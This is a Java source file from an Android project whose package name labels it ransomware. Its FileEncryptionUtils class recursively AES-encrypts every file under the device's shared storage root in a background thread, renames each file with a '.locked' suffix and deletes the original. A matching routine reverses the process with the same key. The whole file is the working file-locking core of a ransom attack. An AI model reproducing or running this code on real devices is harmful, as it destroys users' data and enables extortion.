package com.example.nonameappransomware;

import android.content.Context;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;

import javax.crypto.SecretKey;

public class FileEncryptionUtils {

    private SecretKey encryptionKey;
    private byte[] encryptionIv;
    private Context context;

    public FileEncryptionUtils(Context context, SecretKey key, byte[] iv) {
        this.context = context;
        this.encryptionKey = key;
        this.encryptionIv = iv;
    }

    // 전체 폴더의 파일 암호화
    public void lockAppFiles() throws IOException {
        // File rootDir = Environment.getExternalStorageDirectory(); // 루트 디렉토리
        File rootDir = new File("/storage/emulated/0");

        if (rootDir.exists() && rootDir.isDirectory()) {
            new Thread(() -> {
                try {
                    lockFilesInDirectory(rootDir);
                    System.out.println("Success Entire Files Encryption");
                } catch (Exception e) {
                    e.printStackTrace();
                    System.err.println("Failed Entire Files Encryption");
                }
            }).start();
        } else {
            System.err.println("Root Directory does not exist.");
        }

    }

    // 전체 폴더의 파일 복호화
    public void unlockAppFiles() throws IOException {
        // File rootDir = Environment.getExternalStorageDirectory(); // 루트 디렉토리
        File rootDir = new File("/storage/emulated/0");
        if (rootDir.exists() && rootDir.isDirectory()) {
            new Thread(() -> {
                try {
                    unlockFilesInDirectory(rootDir);
                    System.out.println("Files unlocked successfully!");

                } catch (Exception e) {
                    e.printStackTrace();
                    System.err.println("Error unlocking files.");
                }
            }).start();
        } else {
            System.err.println("Root Directory does not exist.");
        }

    }

    public void lockFilesInDirectory(File directory) throws IOException {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    lockFilesInDirectory(file);
                } else {
                    encryptFile(file);
                }
            }
        }
    }

    public void unlockFilesInDirectory(File directory) throws IOException {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    unlockFilesInDirectory(file);
                } else {
                    decryptFile(file);
                }
            }
        }
    }

    private void encryptFile(File file) throws IOException {
        if (file.getName().endsWith(".locked")) {
            System.out.println("File is already encrypted: " + file.getAbsolutePath());
            return;
        }

        File encryptedFile = new File(file.getAbsolutePath() + ".locked");
        try {
            AESUtil.encryptFile(encryptionKey, encryptionIv, file, encryptedFile);
            if (!file.delete()) {
                System.err.println("Failed to delete original file: " + file.getAbsolutePath());
            }
        } catch (Exception e) {
            throw new IOException("Error encrypting file: " + file.getAbsolutePath(), e);
        }
    }

    private void decryptFile(File file) throws IOException {
        if (!file.getName().endsWith(".locked")) {
            System.out.println("File is not encrypted: " + file.getAbsolutePath());
            return;
        }

        File decryptedFile = new File(file.getAbsolutePath().replace(".locked", ""));
        try {
            AESUtil.decryptFile(encryptionKey, encryptionIv, file, decryptedFile);
            if (!file.delete()) {
                System.err.println("Failed to delete encrypted file: " + file.getAbsolutePath());
            }
        } catch (Exception e) {
            throw new IOException("Error decrypting file: " + file.getAbsolutePath(), e);
        }
    }

    public void encryptDataToFile(byte[] data, File file) throws IOException {
        try (FileOutputStream fos = new FileOutputStream(file)) {
            byte[] encryptedData = AESUtil.encryptData(encryptionKey, encryptionIv, data);
            fos.write(encryptedData);
        } catch (Exception e) {
            throw new IOException("Error encrypting data to file: " + file.getAbsolutePath(), e);
        }
    }
}
